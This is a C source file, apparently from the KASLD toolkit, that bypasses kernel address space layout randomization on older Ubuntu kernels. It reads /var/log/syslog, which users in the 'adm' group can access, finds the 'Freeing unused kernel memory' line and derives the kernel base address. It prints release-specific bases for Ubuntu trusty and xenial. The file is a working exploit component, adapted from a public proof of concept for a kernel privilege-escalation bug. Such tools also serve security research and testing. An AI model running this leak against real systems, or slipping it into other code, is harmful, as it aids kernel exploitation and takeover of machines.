// This file is part of KASLD - https://github.com/bcoles/kasld
//
// free_reserved_area() syslog KASLR bypass for SMP kernels.
//
// On Ubuntu systems, `kernel.dmesg_restrict` can be bypassed by
// users in the `adm` group, due to file read permissions on log
// files in `/var/log/`.
//
// $ ls -la /var/log/syslog /var/log/kern.log
// -rw-r----- 1 syslog adm 1916625 Dec 31 04:24 /var/log/kern.log
// -rw-r----- 1 syslog adm 1115029 Dec 31 04:24 /var/log/syslog
//
// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
//
// Mostly taken from original code by xairy:
// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
// ---
// <bcoles@gmail.com>

#define _DEFAULT_SOURCE
#include "kasld.h"
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned long get_kernel_addr_syslog_free_reserved_area() {
  FILE *f;
  char *endptr;
  char *substr;
  char *addr_buf;
  char *line_buf;
  const char *path = "/var/log/syslog";
  const char *needle = "Freeing unused kernel memory";
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] searching %s for free_reserved_area() info ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    substr = strstr(buff, needle);
    if (substr == NULL)
      continue;

    line_buf = strtok(substr, "\n");
    if (line_buf == NULL)
      return 0;

    addr_buf = strstr(line_buf, "(");
    if (addr_buf == NULL)
      return 0;

    addr = strtoul(&addr_buf[1], &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  fclose(f);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_syslog_free_reserved_area();
  if (!addr)
    return 1;

  printf("leaked __init_begin: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);

#if defined(__x86_64__) || defined(__amd64__)
  printf("kernel base (ubuntu trusty): %lx\n", addr & 0xffffffffff000000ul);
  printf("kernel base (ubuntu xenial): %lx\n",
         (addr & 0xfffffffffff00000ul) - 0x1000000ul);
#endif

  return 0;
}
